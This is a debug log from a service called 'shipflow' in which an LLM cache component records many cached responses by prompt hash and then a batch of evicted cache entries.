2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 00b600da
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 92f6a032
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 50851c53
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: bfbd6530
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 229d633e
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 6d2610ff
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ddfd0154
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9e7e0c61
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: efe78e71
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c549919a
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 732fa419
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 275f2c21
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 64839057
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ec313de9
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8d7eb8e3
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a6ec5c82
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: caba2f74
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 71f40542
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1c148806
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b6b5db34
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c847344e
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 398fb1b4
2026-01-17T23:26:50.279Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 4beabf47
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8c60444f
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7afc4d17
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3c0c9c4e
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b9c77e8e
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8b5fe511
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7dd46a56
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 002e6822
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d7ba3221
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b660239c
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 044aa69d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 304918f8
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9dd216bb
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a82ff2c1
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: bea38846
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 23f16d58
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d5b5c383
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8c56f79e
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8022d47b
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8f949453
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b86ad23b
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 438513e0
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 994ff062
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 262aefcd
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e13e3b91
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 949edf46
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2aa9a45b
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 278943e6
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 0cd8e459
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e6d26359
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7f170ee6
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7275610b
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1f37e973
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 622c5c73
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5046eb36
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c494bb0d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cdf43767
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 6ec9dfdc
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c6e30c39
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: dc391b4d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1ce292ab
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ade77f47
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9c24a3cd
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9f7e0753
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 598e026d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ba66d87d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 30a14431
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f4841731
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: dc4e3e94
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a274150f
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f1c78c57
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 6b253be7
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e71b9ad8
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 031ff8de
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 359aebd0
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5a207b54
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 959b7a02
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f9b5b483
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 83d57610
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b27c774c
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5304675d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d4cf8266
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8aa191d4
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d6acec19
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 96adfc45
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 66a4556c
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 48ac931d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 34f790fe
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9ccc4d52
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: af5e0e40
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3ba0ae11
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3aa17e61
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d69d0460
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 01164367
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 779b2487
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 674401d9
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a8cbb807
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: de145f25
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 69266fd6
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: fd776a29
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cc0a319f
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d650eb7d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7c3cc4dc
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2ef707ea
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9fd83f1f
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f89b7d60
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8b292224
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ebae7fdb
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2378dceb
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 77a674c9
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b2b613fb
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 10ffd7c7
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 934fcb33
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d5c634ed
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8f073ff2
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1bc1c66b
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d170ceda
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7239ae9e
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 484a07c7
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c236a8b2
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 873c329a
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8049a9ba
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7c75e47d
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 44e98870
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ceabce76
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d3746b9f
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 088ae8d2
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c93a9ce2
2026-01-17T23:26:50.280Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: edaef12b
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 448a8ea9
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1efa6a53
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d349116c
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 4e123548
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2696071c
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d90623f5
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8c38ad73
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 70bfebf4
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 29a1cb80
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 8267c652
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c95e65c3
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f99ec28f
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5c26d3a5
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 48b9c00e
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1eed7a2a
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cdd8d341
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c16aa3a7
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2f6b843e
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f1dc07e6
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7ba5aab1
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b23acc73
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f45a9716
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cfda1493
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f14e159e
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e4aabf2a
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 0b751113
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2e49f9b0
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 159381f1
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5e6cbbe6
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 08c372fb
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5cd47d1a
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7410e38f
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3ebeefaa
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f7ad6dd3
2026-01-17T23:26:50.281Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7fd3b094
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 42b69f29
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: c05889ad
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: e6361dc9
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: f5178a5d
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 1a3c3a98
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: d897a6a8
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 5942e3ec
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 808b5920
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 29a4c0fc
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 3a0cecdd
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 21dab7a3
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 3adeca05
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: a27200be
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 43b4e6fe
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 2a01b2b5
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: b6e7d9ad
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 6f4ef3a0
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: effbde6d
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 1bcf8b3e
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 42eca619
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: c58930a2
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 044ab961
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 7edfcdef
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 3f38654c
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 599d1c2d
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 83e08fa3
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 65c76252
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: c2417a32
2026-01-17T23:26:50.283Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: d99c3972
